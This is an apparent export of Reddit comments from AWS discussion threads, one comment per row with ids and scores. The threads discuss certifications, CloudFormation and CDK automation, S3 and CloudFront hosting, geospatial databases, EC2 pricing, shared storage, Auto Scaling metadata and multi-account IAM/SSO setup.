g83yob3,j753h1,Start with Cloud Practitioner. It will give you a fantastic overview of many of the AWS services and actually doing that should help you work out which of the specialities is for you.,1.0
g843vfw,j753h1,"I'd recommend starting your learning with CCP, but don't worry about taking the exam. Once you've completed the course and feel comfortable with the concepts, I would look into acquiring a developer-level cert (dependent on what you're planning on focusing on in AWS).

You don't need the CCP to move into the higher level certs, I started right off as a developer.",1.0
g83n4m9,j764h1,www.aws.training,0.0
g83le5f,j77rfk,Have you considered using cloudformation to automate the process? Launch ec2 instances using stacks and automate cloudwatch and sns topic subscription.,2.0
g83up0z,j77rfk,So it looks like the organization is moving towards AWS CDK so once I am more familiar with that I can develop the same type of automation there. But this is great info just wanted to see what was the correct way of doing it!,1.0
g84xtgh,j77rfk,Glad i could help!,1.0
g83oocr,j77rfk,"CloudFormation is my recommendation too. Here's a blog I wrote with some example templates to get you started.


https://www.performancemagic.com/2020/07/26/basic-cloudwatch-setup/",1.0
g83uudx,j77rfk,I believe the standard management has set for us is to use CDK so I will have to figure out how to perform a similar function with Python in CDK. Thanks for letting me know just wanted to make sure I wasn’t grossly doing something wrong!,1.0
g851esz,j77rfk,"I'd argue CDKs goals are a bit different and that you should have a mix of CDK and synth'd CloudFormation templates. I'd strongly suggest investigating service catalogue and Control Tower.

Good luck",1.0
g84g23v,j77rfk,"Instead of monitoring each server individually, you can use CloudWatch Events to  watch for specific events (including launches and terminations).  You can even use a Lambda function to filter those events so that it can be specified to only notify when it's from a server tagged as Dev, WebServer, or whatever.  Connect the SNS topic and you are good to go.",1.0
g8212hf,j717s9,"Sorry if this is a dumb question but what was this infrastructure built with? Cloud formation, manually, or other (terraform etc)?",1.0
g824kde,j717s9,"The stack was built manually. I edited my post to describe it. Check it out. :)

It's basically meant to be used in a template GitHub repository for game developers that want to quickly start a multiplayer project with a free server. Think about game-jams where you're supposed to code a game in a week. More specifically, if you care about that, it's for [the libGDX framework](https://libgdx.com/).

The repository I want to port to a Template GitHub Repository is [this one](https://github.com/payne911/marvelous-bob), which was supposed to be a game-jam submission, but I didn't have time to finish due to how long to took me to configure so many things for the multiplayer support.",1.0
g83hj0l,j7a4qc,Let the cost triple so that your company stop that stupid policies. You are not the one paying anyway.,11.0
g83hztr,j7a4qc,"Or they could say ""see, told you, cloud is expensive let move everything on-prem""",6.0
g83t05w,j7a4qc,oh god no,1.0
g83t3e9,j7a4qc,"It's required by a global operating security team, I doubt they'll care if locally we lose customers because of their requirements.",1.0
g83xdnt,j7a4qc,"I mean, if they don’t care, why should you?
I assume it doesn’t make your job harder or more painful, does it? All that happens is it costs more for the company that has to find money to maintain it. Or if they lose local customer, they still have to pay your salary.",3.0
g83xu8g,j7a4qc,"Honestly, as someone who makes decisions like that, we tend to bake in exclusions to wide brush stroke rules. That said, every reasonable (subjective) approach will be checked for exhaustion before giving an exception.

Passionate arguments won't work, but approaching from: we tried a, b, c, d, e and this is going to cost x. We can offset the risk by doing Y instead and still meet compliance regulation and security regulation. At cost lower than x.

That said, there are reasons for the decisions architecture makes, and usually it's compliance/legal/security/financial related so those concerns need to be addressed with any counterproposals or requests for exclusions (how you are going to mitigate the risks).",1.0
g83f8ca,j7a4qc,"Christ. I bet that’s costing you a lot for not very much.

Cloudfront can’t route to different origins based on aliases or sub domains without using Lambda@Edge. By default it’s paths only.",6.0
g83mp3a,j7a4qc,"well - you can actually \[ideal or not you decide\] and here is how:

1. have 2 domains in R53 [dev.example.com](https://dev.example.com) and [test.example.com](https://test.example.com)
2. map both to the same distribution \[cloudfront\]
3. have 2 different behavior as /dev and /test
4. so url [dev.example.com/dev](https://dev.example.com/dev) would be mapped to dev folder of s3 and [test.example.com/test](https://test.example.com/test) would be mapped to test folder",1.0
g83t7nh,j7a4qc,"hmm ok, and can I use two different buckets as well for this?",1.0
g84ibq2,j7a4qc,Yep. Different paths can point to different origins - so different buckets. It does mean paths will be different for environments which may cause issues with stuff like base hrefs and shiz.,1.0
g87gc7v,j7a4qc,you dont have too but u can. in essence what you asked is absolutely possible and i showed u the way,1.0
g83f8zy,j79j8e,"You actually do not need lambda for static website hosting with s3. Here is documentation on how to do it with just s3:
https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteHosting.html
You could use lambda to build an API for your website to serve dynamic content",5.0
g83fdma,j79j8e,"But the static website is on ""/en"" and ""/id"", and the load balancer have no options to point to s3 directly",-1.0
g83mfe1,j79j8e,"You don’t need a load balancer for a static site either. CDN, if anything.

You can serve the English from /en and Indonesian from /id by routing config only, and default the main .tld to one of those, or route to one of those.

If I’m doing static only, I use Netlify. AWS can be a bit of a bitch and not very pet project friendly.",4.0
g845fvx,j79j8e,"&gt; routing config only

Could you please elaborate more on this? which routing config?
Route 53 can't do URL redirection AFAIK. example myblog.com to myblog.com/en

Btw, this is also for learning purpose",1.0
g89o9ks,j79j8e,"If the website is static then those endpoints will direct to directories relative to the website root on the “file system”. In this case that’s the S3 bucket. So if you have a bucket with resources in “en/foo” and “in/foo” then they’ll be accessible at domain.com/en/foo and domain.com/in/foo

You don’t need routing for this.

It sounds like you want to route those files straight to domain.com/foo though? How does your website determine which one to pick?",1.0
g83naa6,j79j8e,"After looking at your older post, I’m still struggling to understand why you’re using a load balancer at all. You just need to config Route 53 or whatever to point to the correct path based on either [DNS/IP geo location](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resource-record-sets-values-geo.html), or use HTML5 geolocation to route to it from the landing page.",3.0
g8447i3,j79j8e,"&gt;  I’m still struggling to understand why you’re using a load balancer at all

The load balancer is used for map backend (ec2), s3 bucket in a single host.

So when the user open myblog.com, then it's redirecting to myblog.com/id or myblog.com/en


I thought Route 53 only can redirect to a subdomain/other domain, not `/en` or `/id`?

I still learning btw. gonna try your suggestion, thanks!",1.0
g83w3yp,j79j8e,"I think you should reconsider your architecture. For a personal blog, you should consider S3/Cloudfront for the static site, and using SAM CLI to set up a Node JS Lambda that will be served through API Gateway.

Are you using a static site generator, or hand coded? I have written a tutorial on using Hugo to generate a static site with some JavaScript and then uses our open source tool (Parima) to deploy to S3 and CloudFront and handle setting up your domain and adding an SSL certificate.  


[How To Build an Angular 10 and Tailwind CSS Application and Deploy to AWS, Using Parima](https://blog.formkiq.com/tutorials/use-parima-with-angular)",1.0
g83bqf7,j78pyb,Postgres with PostGIS is the gold standard for working with geospatial data. That's definitely where I'd start.,5.0
g83jdm0,j78pyb,"I know, but the only option is the Aurora Serverless then, which will go to about $70 per month which I want to avoid (if I do not use it as much at the beginning)",1.0
g83ptf0,j78pyb,"Does your entire stack need to be serverless? If not, you can run a Postgres RDS instance for $15-$30 per month.

You could also do a hybrid approach and have your geospatial heavy processing in a Postgres database while your other data is stored somewhere else like DynamoDB. How much that would help you as far as automatically scaling depends a lot on how your geospatial data is used.",3.0
g83mspu,j78pyb,"Could you use RDS Proxy to make Lambda connections to an Aurora Postgres DB? 

[https://aws.amazon.com/rds/proxy/](https://aws.amazon.com/rds/proxy/)",1.0
g87td6q,j78pyb,Aurora can be configured to auto pause if there is no active connections. So you pay only for time you actually use it (minimum of 5 minutes as I remember),1.0
g83dxw6,j78pyb,"Postgres with PostGIS or Elasticsearch if you want quick, efficient and reliable. 

Do not use a key value store like DynamoDB.",3.0
g83bh1v,j78pyb,"I dont believe a OLTP database is a good solution but I don't know your use case so I wouldn't know what to recommend.

Aurora is OLTP but it's efficiency gains over other relational DBMSs makes it an okay approach. https://aws.amazon.com/blogs/database/amazon-aurora-under-the-hood-indexing-geospatial-data-using-z-order-curves/

You could use Redshift as well - it has native support for geospatial data. This might be overkill depending on your use case.
https://docs.aws.amazon.com/redshift/latest/dg/geospatial-overview.html


Lastly, you could even just dump the geospatial data into s3 and use Athena to query.
https://docs.aws.amazon.com/athena/latest/ug/querying-geospatial-data.html",2.0
g83ja3w,j78pyb,"My data is pretty dynamic, so s3 and Athena is not an option.  
Redshift for sure is overkill, also the pricing is horrible...",1.0
g838vv6,j78pyb,have you tried Postgres?,1.0
g83atdg,j78pyb,Does not go well with serverless cost scaling. There is Aurora Serverless but it is pretty expensive in this pricing model.,1.0
g83mruz,j78pyb,"You could try Athena 

https://docs.aws.amazon.com/athena/latest/ug/querying-geospatial-data.html",1.0
g83n1i4,j78pyb,"I’ve been using atlas it’s seems ok, just the free tier at the moment. Not sure I understand your comment about data transfer. I’m not peering, though I can understand why that might be nice.",1.0
g86x893,j78pyb,"Hi,

Take a look here: [https://docs.atlas.mongodb.com/best-practices-connecting-to-aws-lambda/](https://docs.atlas.mongodb.com/best-practices-connecting-to-aws-lambda/) and especially the green ""alert"".",1.0
g87e0sr,j78pyb,"that seems obvious though? how else would you connect to it if it wasn't part of your AWS VPC? We don't know the IP of lambda hence the [0.0.0.0/0](https://0.0.0.0/0). This was the part i was referring to about being nice, keeping the traffic inside. Depends on what you're doing and where you're at. If its a sandpit to see if its going to do what you want or you have no budget it's might be an option.",1.0
g836uoe,j77q6n,"Do you just need a Windows workspace?

https://aws.amazon.com/workspaces/",4.0
g83ix6i,j77q6n,Workspaces is more of a persistent virtual desktop environment. As suggested I’d just create and ami and create the instances from it and destroy them at the end of each day.,2.0
g85elwm,j77q6n,That was the original plan.I thought there may have been a pre made way or easier way. Thanks for that.,1.0
g85mc16,j77q6n,Build your template for such instances with CloudFormation and make it a service catalog product. With that you can easily create it multiple times for each attendee and terminate it afterwards,2.0
g85urzy,j77q6n,Will try :),1.0
g864w8s,j77q6n,AppStream (with or without Desktop View),2.0
g8kv61p,j77q6n,I would use Amazon workspaces for this. I've done it in the past for virtual classroom environments and it worked out really well,2.0
g8mj4y1,j77q6n,I am leaning on this side of the fence at the moment. Just trying to figure how it works with starting multiple at once. The image would need to be reset every time there's a new class. So i would need to create 10-12 machines at a time. I have been looking at the docs and demo videos I will have to play inside AWS it'self to see if we can do it in a quick way.,1.0
g8342hn,j77q6n,"Yeah NICs tend to be left behind. But then you don't pay for them and they get reused so who cares?

As long as you make sure any EBS volumes have the delete with instance ticked, then you won't see anything that will cost money left behind.

And if you're really worried about it make yourself a script to build the AMI and close the account when everyone is done. Then next time, start a new account, fire up an instance and run your script. If the customisation is easy enough, you can add the script to user-data at launch and add ""shutdown"" to the end. Then your script becomes start instance, wait for it to stop, create AMI.

But if it is that easy, you can launch all the training boxes with the install script in the user data, you just have to remember to do it a bit early so they are ready for your users.",1.0
g83ggn4,j77q6n,I will look into that too. Thanks. I haven't done any AWS scripting before and I was looking into it as the others have suggested. It seems easy enough to do.,1.0
g84btpa,j77q6n,"If you have an EBS volume that did not have it ticked, it is still visibile even if the EC2 instance is deleted, right? (in the EBS volume list). You just have to do it manually.",1.0
g835ske,j77q6n,"Create an AMI with whatever you need in it. Then, create a CloudFormation stack with a VPC and the EC2 instances which use the same AMI. Export the IPs of each instance.

You can delete this stack at the end of a day and create it again the next. Should take a few mins each time.",1.0
g8376ft,j77q6n,"Thanks I will look into both methods. I just need a blank windows and an install of a program. The people will use the program and at the end it will all will need to be reset. So I will look at both :)

Thanks",1.0
g831576,j76tq2,Make yourself a lambda which starts/stop the channel,2.0
g8341dx,j76tq2,"The schedule in MediaLive is for actions INSIDE a channel (change source, etc)

To control the channel itself you want to use a lambda to start/stop",2.0
g82u90o,j75id9,"The EC2 instances themselves only charge you when they're running. However, even if the instances are stopped, you'll still have to pay a fee for EBS storage, any elastic IPs (you're charged for them if the instance is stopped), etc. Also, consider that with EC2, you have to pay for data transfer if you're expecting a lot of traffic or movement of large files in the hours that it is running

If you just need something simple, maybe consider LightSail. The billing model is much simpler there since it's not meant for the same audience as EC2",4.0
g82u2lh,j75id9,"As long as you remember to stop your instance when you're not using them, you will not be billed once the instance is stopped.

If your server has a regular schedule for starting and stopping, you can set up the Instance Scheduler solution to automate instance start/stop, usage of which also falls under the free tier [https://aws.amazon.com/solutions/implementations/instance-scheduler/](https://aws.amazon.com/solutions/implementations/instance-scheduler/)

For 8GB of EBS storage attached to your instance, you will pay $0.80 per month ($0.10 per GB-month in us-east-1 or us-west-2 regions).

And you will probably incur some Data Transfer cost as well, for data originating from your EC2 Instance going out to the Internet (First 1GB free per month, and then $0.09 per GB up to 10 TBs)",3.0
g82pivl,j75id9,"You get billed for it being on, storage space, throughout, etc

So if you're worried about it starting to rack up bills you can certainly turn it off or look into the instance scheduler (probably overkill)

Have you looked at the AWS calculator (calculator.aws)? That does a good job of telling you expected costs based on use time",2.0
g82pr2i,j75id9,"What he said ^, and when caught on the spot with a question this real quick guide is quite helpful - https://www.ec2instances.info",1.0
g82pt1o,j75id9,I did but don't know enough about servers to really be sure. I think l figured it out and it'll only cost a few bucks/month to run it. I just wasn't sure that it only charged when running. Tho l do recall that elastic ip gets billed when not running.,1.0
g82q3mc,j75id9,"Also keep in mind that you pay for things like EBS storage and S3 storage for the length of time that you're keeping stuff, not when the EC2 instances are running that will access the data. 

So yes, switch the instances off when you're not using them. But make sure you are aware of how much persistent storage you're using too.",1.0
g82q7to,j75id9,Okay. I only need about 8gb of storage so l was just going to use ebs. Is s3 significantly cheaper for that small amount of storage?,1.0
g82qnhs,j75id9,"Depends how you use it. If you've got 8GB in total then that probably comes in under the free tier, so good news there. 

Free tier aside, it can get quite complicated depending on the usage patterns - with S3 you pay for volume and for actions. And there's all the tiers and stuff for both EBS and S3. But I don't think you'll need to worry about that here if it's 8GB in total, just EBS it.",1.0
g82qz61,j75id9,I thought the free tier was only for 12 months. Is there a free tier that extends beyond that?,1.0
g82rsl3,j75id9,"Some stuff is always free, some stuff is free for 12 months only. T&amp;C might change any time.

After 12 months I think you'd have to pay for storage, but 8GB really is not going to cost a lot. It's not nothing, but close enough.",1.0
g866db5,j75id9,"It actually depends on the EC2 instance you are using. Not all instances are eligible for free tier. So if you are using a t2.micro instance in your first year you will get 750hrs of compute time per month which I believe covers your 40hrs per week. Even if you leave your instance running for the whole month you won’t be charged since there are approximately 744 hours in a month.

For your EBS the free tier limit is 30GB which cover your required 8GB but be mindful of the IOPS. If your go above the limit of 2m you will be charged. For more details on free tier visit [AWS free tier](https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&amp;all-free-tier.sort-order=asc).

There are other ways to reduce the cost of your EC2 like Reserved instances or Spot instances. There is a cost calculator that can be used to determine your likely monthly cost based on selected services. [AWS pricing calculator](https://calculator.aws/#/) link",1.0
g8272v2,j72p53,"AWS services sometimes have their own capacity pools, and so it may not impact you... that said, these services are using EC2, too, so that risk does apply.

Can you use two AWS Regions? If you can spread your usage between us-east-1 and us-west-2, you can reduce your change of seeing insufficient capacity errors.",2.0
g84myyo,j72p53,"Thanks. It complicates things but I can certainly use the other region in the US as well. I was just wondering if it's something that is likely to happen (with EC2 and G4 it appears to be common), or more like a severe error that actually gets reported on the service health dashboard...",1.0
g84yg9z,j72p53,"Not sure, I haven't run into the issue... I doubt it would be a service health dashboard message, though, similar to EC2. The fleet notifications tab might do it?

Also with AppStream, you can use 2 subnets/AZs through the console, but you can specify a 3rd one through the API... So that might reduce the chances of getting an insufficient capacity errors.",1.0
g87ufxy,j72p53,Thanks for the tip regarding the API. Any idea what happens under the hood? Do they just choose an AZ at random when launching a new (stopped) instance?,1.0
g87vttr,j72p53,"I think it evenly distributes capacity across the AZs when provisioning. If you check your ENIs, you'll see the subnet (and thus AZ) distribution of the instances being created.

I would guess if a single AZ starts ICEing, it would automatically create the remaining capacity in the other AZ, similar to an autoscaling group.

Connecting to an on-demand session might be a bit more challenging... Like the AZ may have had capacity when the instance was created, but might not when AppStream tries to start the instance. Not sure what happens then, but the user probably sees an error, and has to retry. I don't know what logic AppStream uses to pick a stopped instance - I'm guessing it's random between all the instances available.",1.0
g81xlux,j711cu,You mean [the old one](https://calculator.s3.amazonaws.com/index.html)?,1.0
g81xwcw,j711cu,"No, I mean [this one](https://www.youtube.com/watch?v=gur7rsHVoPI&amp;ab_channel=Contino).",1.0
g827hnt,j711cu,"Ah, I think that's available [here](https://mpa-proserve.amazonaws.com/) but you need to be part of the APN to access it.",1.0
g83hijs,j711cu,Has it always been a part of APN? or is it something that was remodeled?,1.0
g81ufp1,j6yt8p,Isn't RexRay an abandoned project?,1.0
g876duo,j6yt8p,Hasn't been updated since January 2019 and the website returns a 503 (and apparently has been doing so/been down since at least mid October 2019) ; I certainly wouldn't use it.,1.0
g82srcc,j6yt8p,You can use EFS as persistent storage if you use Fargate.,1.0
g831xy3,j70ns7,"Just try it out. Since splice is a system call, on what do you want to use it? Network? The [ENA driver](https://github.com/amzn/amzn-drivers/tree/master/kernel/linux/ena) doesn't mention anything specific on DMA. The point of splice is zero copy, so it doesn't do DMA, it just passes references around. DMA may happen on the leaf nodes, e.g. when writing from disk to the network resolved from those references.

If DMA copy is not possible, the kernel will do a CPU copy which is still faster, as it's done in kernel space and not user space.",1.0
g840xfq,j70ns7,"I am doing it for Network to Network (TCP Proxy) but interested in higher performance. On this [wiki link](https://en.wikipedia.org/wiki/Splice_(system_call)) it said DMA was necessary, thats why I asked. I am thinking of trying a dedicated to test.",1.0
g81rekp,j6xhk8,"Those 2 are different storage systems - one is object based (s3), with no hierarchy or whatsoever. S3 is also the cheapest option. If u need better performance and structured file system then EFS is better choice, but pricing is much higher then S3 and EBS",2.0
g81v8w1,j6xhk8,"Hey, thanks, I understand but I don't need any hierarchy. Now that I think about it more, multi attach EBS might make the most sense since I can have the instances in the same AZ?",1.0
g83cyz0,j6xhk8,"Multi attach EBS is not set and forget. You have to take care of correct locking etc or your data and filesystem will very quickly become corrupt.

You will likely need to use a filesystem specifically designed for this purpose.

""Standard file systems aren't supported with EBS Multi-Attach. File systems such as XFS, EXT3, EXT4, and NTFS aren't designed to be simultaneously accessed by multiple servers or EC2 instances. Therefore, these file systems don't have built-in mechanisms to manage the coordination and control of writes, reads, locks, caches, mounts, fencing, and so on.

Enabling multiple servers to simultaneously access a standard file system can result in data corruption or loss. The operation of standard file systems on EBS Multi-Attach volumes isn't a supported configuration.""

To keep things simple, use EFS.  However keep in mind that EFS has a per file operation latency so it's awful for things like full directory scans etc. However it is really good at doing straight reads/writes to files with known directory paths - which sounds like what you are talking about.",2.0
g822r2z,j6xhk8,"EFS sounds like the way to go here. You can mount it like any other file system from multiple servers.

S3 is a bit cheaper per GB but it sounds like you’ll also need to pay for enough EBS on each sever to store a copy and the data transfer costs, plus the headache of having to keep your servers and the S3 data in sync.

Another option is S3fs-fuse. This is a module that allows you to mount S3 buckets as file systems. It works but I’m not sure it offers any benefits over EFS. It is also not suitable for containerised environments.",2.0
g82303x,j6xhk8,"Hey, thanks for the reply. I agree about EFS but I am just a little bit worried about the cost since it's hard to predict. What do you think about EBS multi attach though? It seems like a good solution if all of the instances are in the same AZ.",1.0
g8248pb,j6xhk8,"I’ve never used EBS multi-attach so I don’t know how it performs.

Is it cost or performance that concerns you most?",1.0
g824uds,j6xhk8,"Cost is more important but performance isn't irrelevant either. That's why EBS multi attach looked interesting since in theory it should have pretty good performance.

I think I will try to run some tests to try to estimate costs for EFS however.",1.0
g81rhax,j6xhk8,"What are your requirements for throughput? Once you have those, you can look at the [EFS Limits](https://docs.aws.amazon.com/efs/latest/ug/limits.html) and decide if it's for you.",1.0
g82honj,j6xhk8,"EFS is a lot slower than EBS and about 5x the cost per GB of standard S3. For 200GB, that probably won't be a problem. For small data sizes, there may be some bandwidth allocation that AWS does that slows things way down. If you aren't worried too much about the speed of the drive, it is a good way to share data between computers. 

If the speed isn't adequate, or the extra cost is off-putting, you will probably be better off syncing to local EBS from S3.",1.0
g82m06x,j6xhk8,"Hey, thanks for the reply, there will basically be 3 servers each of which will access a 5 GB model from the shared drive every 2 minutes. I was worried that EFS came with bandwidth costs that would make this unaffordable but it seems that it doesn't?

I will be doing a test to compare the costs. Thanks again!",1.0
g847z5t,j6xhk8,"The EFS ""drive"" needs to be in the same region as the servers. I think there is a way to cross regions, but that starts to get even slower and costs more. Within the region, the storage is what costs you. 

You should probably set up a mock system if you are thinking about going this route. The bandwidth available from EFS can be highly variable due to some throttling that AWS appears to be doing, especially with smaller data sets. I would recommend setting up an EFS drive with a few bundles, pulling the data every 2 minutes, and measure your effective bandwidth.",1.0
g82lv3y,j6zndf,You could do a distinct launch template per ASG and drop the ASG name into a file on the filesystem as part of the user data. That's how we pass chef role/environment into our standard bootstrap for chef.,2.0
g842pmv,j6zndf,"Yeah, that's essentially what I was going to accomplish with the touching of a file, something along those lines injected in user-data in a predictable place. 

Talking with some of our devops guys they essentially do this already so it's probably the way forward.

Thanks!",1.0
g81mzn7,j6zndf,"There's nothing that I can see in the local metadata, but you could do this by running the instance with an IAM role specific to your ASG and base things off of that?

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html",1.0
g81nuvm,j6zndf,"On my phone but I'll definitely look at this deeper. Thanks!

My hesitation around iam and all is this image will be shared out to over 100 accounts, and as I don't have any purview into the org side I'm not sure how easily that could be implemented.",1.0
g81ols7,j6zndf,"yeah that makes it a bit difficult, injecting a value in the userdata is probably the best approach then - you don't necessarily have to have it execute and touch a file, you could just read from the local metadata endpoint, assuming your application/script/whatever has network access

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html",1.0
g832aku,j6zndf,To add: Access to the Instance metadata doesn't need internet access. It's a link local IP address which is captured and fulfilled by the hypervisor.,2.0
g81opja,j6zndf,🤔 hadn't thought of that... I like that,1.0
g8237wg,j6zndf,Could you achieve this with ASG Lifecycle Hooks perhaps? https://docs.aws.amazon.com/autoscaling/ec2/userguide/lifecycle-hooks.html,1.0
g82cn72,j6zndf,"Perhaps, definitely worth a look. Thanks!",1.0
g82r58u,j6zndf,"check out \`ec2\_tag\_info\` module: [https://docs.ansible.com/ansible/latest/collections/amazon/aws/ec2\_tag\_info\_module.html#ansible-collections-amazon-aws-ec2-tag-info-module](https://docs.ansible.com/ansible/latest/collections/amazon/aws/ec2_tag_info_module.html#ansible-collections-amazon-aws-ec2-tag-info-module)

We add ansible-pull to user-data, then use this to get all the tags of the instance. Then specific Roles are run only if certain tags have certain values.",1.0
g844pus,j6zndf,"Yeah, I saw that module while googling after this post yesterday. It's definitely the most elegant doing it externally that I've seen. 

I wrote a bash script to launch instances that grabs a variable from the tags I pass it, one of them is the hostname. That variable then gets injected in user-data to set the hostname. I *think* that might work with TF, but getting all the devops teams on board with that would be a bigger trick than figuring out how to make it work properly...

Thank you for the input!",1.0
g82vsw2,j6zndf,An instance can be aware because there are some tags that an ASG sets that won't be there otherwise.  But you have to write something to query the metadata service.,1.0
g843cs5,j6zndf,I can't find anything in the meta-data that seems to indicate tags or ASG info. Any idea where I should be looking?,1.0
g84easb,j6zndf,I had to go look at the code.  I lied.  You get the instance id and the region from the metadata service and use that info to just query the ec2 API.,1.0
g844f8u,j6zndf,Meant to say thank you for helping me think through this...,1.0
g8327fu,j6zndf,"The Auto Scaling group automatically adds a tag to the instances with a key of `aws:autoscaling:groupName` and a value of the name of the Auto Scaling group.

Thus, as other mentioned, read those tags with ansible.",1.0
g84447u,j6zndf,"Yeah, I know from outside the system it's easily identified. The issue with doing this externally is our org has a LOT of accounts, there will be dozens of ansible systems built for this. We have several devops teams launching static and ASG-member instances, all with different roles and permissions. Making sure the IAM rights to describe tags would be a nightmare to manage (I think?). So I am hoping there's a way on the instance itself, after pulling a playbook of basic host info, if asg it then stops, if non-asg it pulls other playbooks as needed. 

I'm trying to satisfy some audit requirements to have certain agents installed and ensure they're running, that the system is set up in an ansible inventory for patching (if non-asg), etc.",1.0
g844det,j6zndf,"Forgot to add, thank you for the input, helping me sound through this...",1.0
g81iaa9,j6yt23,AWS Cloud9 should suffice i think? [https://docs.aws.amazon.com/cloud9/latest/user-guide/share-environment.html](https://docs.aws.amazon.com/cloud9/latest/user-guide/share-environment.html),1.0
g81l6st,j6yt23,Thanks! I‘ll edit my original post to make it clearer: I want to run WebStorm from JetBrains.,4.0
g81mvh6,j6yt23,"You can setup a windows desktop with remote desktop using these instructions:[https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/connecting\_to\_windows\_instance.html](https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/connecting_to_windows_instance.html)

I'd create new VPC if you're planning to let strangers on to your servers. You might leave the instance running and someone jumps on and starts scanning your network or brute forcing your AWS API for some open IAM polcies.

Here's a list of things i'd consider:

* Run EC2 instance on a separate VPC / Subnet
* Make sure the instance IAM role doesn't allow access to other AWS resources
* Configure security groups to only allow inbound connections to RDP. You'll probably need outbound access for packages
* Turn off instance and rotate password after use
* Don't keep ssh keys on that machine.
* You can set everything else up yourself with the admin user. And on the OS you could create a low level user and use that account for the shared sessions.",1.0
g837c0b,j6yt23,"Thanks, I’ll try that! I will most likely just set up a separate account via Control Tower just to be sure.",1.0
g81qhxy,j6yt23,"You'd need to find an AMI that has an integrated desktop environment, which isn't the most popular way Linux is packed on the cloud. So you'll probably have to setup something like GNOME or KDE yourself.

In either of these cases you'd install the IDE then setup VNC/remote desktop connections via something like TeamViewer. There's of course the question about the amount of concurrent connections.

I haven't done these steps myself before, so I can't really help with the details. But that's where you'd look into.",1.0
g82efuv,j6yt23,"There are a ton of resources that discuss setting up a GUI desktop on Linux and accessing remotely. Once they have a desktop instance running, Google Meetings provides desktop sharing as an alternative to TeamViewer.

Edit: Recommend getting a Lightsail instance which has a fixed amount of bandwidth and storage included in a flat price.",1.0
g832dpg,j6yt23,"Start an Amazon WorkSpace with Linux on it and install your IDE

A nice catch with Amazon WorkSpace is predictable pricing and on daily use a fixed monthly price.",1.0
g8372nt,j6yt23,How can multiple users connect to it at the same time?,1.0
g837sat,j6yt23,Right. You connect via PCoIP and allow the others to access the desktop with any remote tool available like VNC,1.0
g81gvs9,j6yim8,"CloudTrail is the way to go., and it's basically configured and on by default. You can use CloudWatch to create some alerts ie. for when your root account is used or a session was created without the use of MFA.

You can use IAM policies to force MFA, but lately we use AWS SSO for our customers, which makes the process much easier :)",2.0
g82p2rq,j6xaqw,Check the TaskDefinition environment variables,2.0
g81epnp,j6xaqw,"If you copy pasted right, it's just a matter of spacing, here's an excerpt of a working template:           

             `DeploymentConfiguration:`  
                `MaximumPercent: 200`  
                `MinimumHealthyPercent: 75`  
            `DesiredCount: !Ref TaskCount`  
            `HealthCheckGracePeriodSeconds: !Ref HealthCheckGracePeriodSeconds`

DeploymentConfiguration only has MaximumPercent and MinimumHealthyPercent.  DesiredCount and HealthCheckGracePeriodSeconds are properties of the service :)",1.0
g81lnzy,j6xaqw,"Thanks, but I'm afraid that's not the issue. I failed at copy-pasting it seems. I corrected the spacing in my post.",2.0
g81jqhj,j6xvi7,this article might be helpful when considering options.  https://aws.amazon.com/blogs/big-data/how-to-export-an-amazon-dynamodb-table-to-amazon-s3-using-aws-step-functions-and-aws-glue/,3.0
g8309iw,j6xvi7,"Do you need to copy the data from each DDB table into a single place, or are you running ETL against each table and wanting to aggregate the results into a single bucket?

If you want more or less a way to replicate everything in DDB to another spot, i'd use (DDB streams with a lambda)\[[https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Streams.Lambda.Tutorial.html](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Streams.Lambda.Tutorial.html)\], which allows you to basically copy the data every time it's written to DDB.

Alternatively, if you're doing ETL on the data and you need to aggregate the results which are stored in S3 - i'd look at using S3 Batch Operations.  It's designed to take a manifest of objects, and for each one, perform an operation like PUT.  It's massively scalable, so performance should be pretty good as well.

CRR could also work- but i'm not sure there would be any guarantees as to when the data would actually sync.  With a hands on approach, you can control when to copy data, as well as tweak the process depending on performance/observability needs.",1.0
g835fdv,j6xvi7,"For clarification, are you suggesting S3 Batch Operations as a substitute for CRR? As in use Batch Operations to PUT objects from one bucket to another bucket cross-region?

I'm basically trying to funnel new data, daily, from DDB tables in every region into one centralized region where I can put it in a data warehouse. I can do the Transformation at any point during the downstream process, but my first intuition would be to do it before any data ever leaves its original region, and move only data that is ready to be Loaded cross-region.",1.0
g81618x,j6sgw9,We have a cloud team that does this. My account is part of AWS organizations which they manage,6.0
g82gh89,j6sgw9,This,1.0
g81cwc5,j6sgw9,"Me.

NB if you have an sso solution : connect it to one account and let the other accounts trust that account. Everyone logs in to the one account and role switches. No local IAM users in accounts and no roles with trust policies on other accounts.

Then when someone leaves, you know all their access is closed.

And dont use aws sso, there is no need. Do saml direct with that account.",3.0
g81nj3b,j6sgw9,AWS SSO is so much nicer. We had that setup before and the role dance was to annoying. Works well with SAML providers,1.0
g82vxvf,j6sgw9,"I totally disagree with AWS SSO, No API support thus no terraform/cloud formation/AWSCLI. The policy sets and roles that are created exist outside of IAM and thus you can't really use paths/IAM boundaries/SCP's in as meaningful away as you could.

AWS sso will be better when they totally overhaul it, but for now it's pretty undesireable for automation heavy/security conscious organizations.",1.0
g82x7c7,j6sgw9,"They recently added an API: https://aws.amazon.com/about-aws/whats-new/2020/09/aws-single-sign-on-adds-account-assignment-apis-and-aws-cloudformation-support-to-automate-multi-account-access-management/

Didn't test it yet, but seems pretty complete and we are planning to move to it eventually for our automation. Just waiting for the Terraform Implementation, but Cloudformation already exists.",1.0
g82wj7i,j6sgw9,"We have a central team that manages. We're a large enterprise with 10,000 dev who definitely cannot be trust to run their own infra, so we have a team charged with making the cloud easy and safe for them to use. Small shops may have their infra and dev team be the same, but once you start having multiple independant dev teams and no centralization that becomes un-manageable.

we have an account automation processes that creates an account, set's up the SCP, joins our transit gateway, set up IAM to our SAML IDP, sets up some foundational stuff like our cloud trail pipeline, guard duty, config rules, whatever. Then we turn it over to our developers.  


We put a lot of work into making sure that developers cannot remove our security controls, or do any number of bad things in the account.  


Avoid AWS SSO, it's crap. No API support = not worth using. Have people SAML directly into their accounts. This is not trivial because your saml IDp has to know what accounts and what roles people need access to, but it's fast.

&amp;#x200B;

